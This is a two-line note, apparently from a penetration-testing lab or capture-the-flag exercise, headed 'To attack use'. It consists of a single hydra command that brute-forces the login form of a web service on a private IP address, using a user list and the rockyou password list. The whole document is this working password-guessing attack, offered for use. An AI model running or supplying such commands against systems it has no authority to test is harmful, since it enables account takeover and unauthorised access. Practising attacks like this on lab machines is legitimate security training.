# To attack use
hydra -L users.txt -P rockyou.txt 192.168.178.34 -s 9999 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -V
